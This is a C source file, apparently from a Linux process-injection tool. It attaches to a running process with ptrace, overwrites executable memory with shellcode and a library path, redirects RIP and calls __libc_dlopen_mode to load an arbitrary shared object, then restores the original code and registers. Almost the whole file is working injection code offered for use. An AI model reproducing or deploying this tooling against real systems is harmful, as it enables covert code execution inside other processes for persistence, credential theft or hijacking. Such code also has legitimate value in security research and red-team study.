#include <stdio.h>
#include <sys/ptrace.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <signal.h>

#include "inject.h"
#include "ptrace_utils.h"

#define IF_NONZERO_THEN_DONE(res) do { if(0 != res) goto done; } while(0)
#define IF_ZERO_THEN_DONE(res) do { if(0 == res) goto done; } while(0)
#define IF_NULL_THEN_DONE(res) do { if(NULL == res) goto done; } while(0)

static int copy_and_inject(pid_t pid, unsigned long* addr, void* shellcode, size_t shellcode_len, void* outBuff){
	int result = EXIT_SUCCESS;

	if(NULL == outBuff){
		// Force caller to manage memory
		printf("[-] Null out buffer pointer passed. Must be at least size of shellcode_len\n");
		result = EXIT_FAILURE;
		goto done;
	}

	if(0 != *addr){
		// If no address provided, try to find one
		*addr = putils_findExecAddr(pid);
		if(!(*addr)){
			result = EXIT_FAILURE;
			goto done;
		}
	}

	// Read out a copy of the code occupying executable memory
	result = ptraceRead(pid, *addr, outBuff, shellcode_len);
	IF_NONZERO_THEN_DONE(result);
	
	// Inject
	printf("[+] Injecting %lu bytes of shellcode...\n", shellcode_len);
	result = ptraceWrite(pid, *addr, shellcode, shellcode_len);
	IF_NONZERO_THEN_DONE(result);



done:
	return EXIT_SUCCESS;
}

/**
 * @brief Still in PoC state, do not use just yet
 * 
 * @param pid 
 * @param shellcode 
 * @param shellcode_len 
 * @param options 
 * @return int 
 */
int inject_shellcode(pid_t pid, void* shellcode, size_t shellcode_len, uint8_t options){

	unsigned char *code_save = NULL;
	struct user_regs_struct oldregs = {0};
	struct user_regs_struct regs = {0};
	unsigned long addr = 0;
	int target_status = 0;
	int attach_status = DETACHED;
	int result = EXIT_SUCCESS;

	// Find a good address to copy code to
	addr = putils_findExecAddr(pid);
	if(!addr){
		result = EXIT_FAILURE;
		goto done;
	}

	// Attach to the target process
	result = ptraceAttach(pid, &target_status);
	IF_NONZERO_THEN_DONE(result);

	attach_status = ATTACHED;

	// Store the current register values for later
	result = ptraceGetRegs(pid, &oldregs);
	IF_NONZERO_THEN_DONE(result);
	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

	// Allocate memory for code we carve out
	code_save = malloc(shellcode_len * sizeof(uint8_t));

	result = copy_and_inject(pid, &addr, shellcode, shellcode_len, code_save);
	IF_NONZERO_THEN_DONE(result);
	
	regs.rip = addr + 2;
	ptraceSetRegs(pid, &regs);
	IF_NONZERO_THEN_DONE(result);

	result = ptraceCont(pid, 0, (int*)0);
	IF_NONZERO_THEN_DONE(result);

	result = ptraceDetach(pid);
	attach_status = DETACHED;	

done:
	if(NULL != code_save){
		free(code_save);
	}
	if(ATTACHED == attach_status){
		ptraceDetach(pid);
	}
	return result;
}

/**
 * @brief Using our own process. Calulate the offset from the start
 * of libdl in memory to the function entry for dlopen.
 * 
 * @param out_offset 
 * @return int 
 */
static int get_dlopenOffset(unsigned long* out_offset){
	int result = EXIT_FAILURE;
    void* self_dlopen_addr = NULL;
    void* self_libdl_addr = NULL;
	
	// Clear out variable
	*out_offset = 0;
	
	// Open up the library so we can search for symbols
	self_libdl_addr = dlopen("libc.so.6", RTLD_LAZY);
	IF_NULL_THEN_DONE(self_libdl_addr);

	printf("[*] Self libc.so loaded at address %p\n", self_libdl_addr);

	// Now get the address of __libc_dlopen_mode
	self_dlopen_addr = dlsym(self_libdl_addr, "__libc_dlopen_mode");
	IF_NULL_THEN_DONE(self_dlopen_addr);

	printf("[*] __libc_dlopen_mode() found at address %p\n", self_dlopen_addr);

	/*
	 * Through experimenting, looks like when libdl.so is opened
	 * it is opened at a slight offset, since this can't be guaranteed to be
	 * the same we need to get the actual beginning of libdl.so 
	 */
	self_libdl_addr = (void*)putils_findLibrary("libc", -1);

done:
	if(NULL == self_libdl_addr){
		printf("[!] Error opening libdl.so\n");
	}
	else if(NULL == self_dlopen_addr){
		printf("[!] Error locating __libc_dlopen_mode() function\n");
	}
	else{
		/*
		 * Due to ASLR, we need to calculate the 
		 * address offset from the base of libdl and 
		 * the address of __libc_dlopen_mode
		 */
		*out_offset = (self_dlopen_addr - self_libdl_addr);
		result = EXIT_SUCCESS;
	}
	return result;
}

static
int find_target_libc_dlopen(pid_t target_pid, unsigned long* target_dlopen_addr){
	
	int result = EXIT_FAILURE;
    unsigned long offset = 0;
	unsigned long target_libdl_addr = 0;

	// Find the base address of libdl in our target process
	target_libdl_addr = putils_findLibrary("libc", target_pid);
	IF_ZERO_THEN_DONE(target_libdl_addr);
	printf("[*] libc located in PID %d at address %lx\n", target_pid, target_libdl_addr);

	// Calculate the actual offset
	result = get_dlopenOffset(&offset);
	IF_NONZERO_THEN_DONE(result);
	
	// Use offset to figure out where function is in target memory
	*target_dlopen_addr = target_libdl_addr + offset;
	printf("[*] __libc_dlopen_mode() offset in libc found to be 0x%llx (%llu) bytes\n", (unsigned long long)(offset),(unsigned long long)(offset));
	printf("[*] __libc_dlopen_mode() in target process at address 0x%lx\n", *target_dlopen_addr);
	
done:
	return result;
}

int inject_so(pid_t pid, void* shellcode, size_t shellcode_len, char* soPath, size_t soPath_len, uint8_t options){

	
	struct user_regs_struct oldregs = {0};
	struct user_regs_struct regs = {0};
	unsigned long executable_mem_addr = 0;
	unsigned long target_dlopen_addr = 0;
	unsigned char *code_save = NULL;
	size_t toSaveSize = (soPath_len + shellcode_len);
	int target_status = 0;
	int attach_status = DETACHED;
	int result = EXIT_SUCCESS;


	// Figure out where dlopen() in the target process is
	result = find_target_libc_dlopen(pid, &target_dlopen_addr);
	IF_NONZERO_THEN_DONE(result);

	// Attach to the target process
	result = ptraceAttach(pid, &target_status);
	IF_NONZERO_THEN_DONE(result);
	attach_status = ATTACHED;

	// Store the current register values for later
	result = ptraceGetRegs(pid, &oldregs);
	IF_NONZERO_THEN_DONE(result);
	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));

	// Allocate memory for code we carve out
	code_save = malloc(toSaveSize * sizeof(uint8_t));

	// Find a good address to inject
	executable_mem_addr = putils_findExecAddr(pid);
	if(!executable_mem_addr){
		result = EXIT_FAILURE;
		goto done;
	}

	// Read out a copy of the code occupying executable memory
	result = ptraceRead(pid, executable_mem_addr, code_save, toSaveSize);
	IF_NONZERO_THEN_DONE(result);

	// Inject library path to memory
	result = ptraceWrite(pid, executable_mem_addr, soPath, soPath_len);
	IF_NONZERO_THEN_DONE(result);

	// Inject shellcode
	result = ptraceWrite(pid, (executable_mem_addr+soPath_len), shellcode, shellcode_len);
	IF_NONZERO_THEN_DONE(result);

	// Set RIP to shellcode
	regs.rip = (unsigned long long)executable_mem_addr+soPath_len+2;
	// Set RDI to injected library path
	regs.rdi = (unsigned long long)executable_mem_addr;
	// Set RSI to 1 RTLD_LAZY
	regs.rsi = 1;
	// Update RAX to point to dlopen()
	regs.rax = (unsigned long long)target_dlopen_addr;
	ptraceSetRegs(pid, &regs);
	IF_NONZERO_THEN_DONE(result);

	// Run
	result = ptraceCont(pid, 0, (int*)0);
	IF_NONZERO_THEN_DONE(result);

	// Catch expected trap call
	waitpid(pid, &target_status, WUNTRACED);
	if (WIFSTOPPED(target_status) && WSTOPSIG(target_status) == SIGTRAP) {
		printf("[+] Target trap successfully caught\n");

		// Grab regs
		result = ptraceGetRegs(pid, &regs);
		IF_NONZERO_THEN_DONE(result);

		if(0 != regs.rax) {
			/*
			 * __libc_dlopen_mode should return a non-zero value in
			 * rax containing the address of the loaded library
			 */
			printf("[+] %s was successfully loaded into %d at %llx\n", soPath, pid, regs.rax);
		}
		else {
			printf("[-] %s failed to loaded into %d target rax == %llu\n", soPath, pid, regs.rax);
		}

		/*
		 * Here we need to restore the target
		 * back to its original state
		 */
		// Write back old instructions
		printf("[+] Writing back original instructions...\n");
		result = ptraceWrite(pid, executable_mem_addr, code_save, toSaveSize);
		IF_NONZERO_THEN_DONE(result);
		
		// Set registers to original state
		printf("[+] Setting registers to original state...\n");
		result = ptraceSetRegs(pid, &oldregs);
		IF_NONZERO_THEN_DONE(result);

		printf("[+] Resuming target process execution...\n");

		result = ptraceDetach(pid);
		attach_status = DETACHED;	
	}
	else{
		printf("oh boy...probably crashed the target :(\n");
	}

done:
	if(NULL != code_save){
		free(code_save);
	}
	if(ATTACHED == attach_status){
		ptraceDetach(pid);
	}
	return result;
}
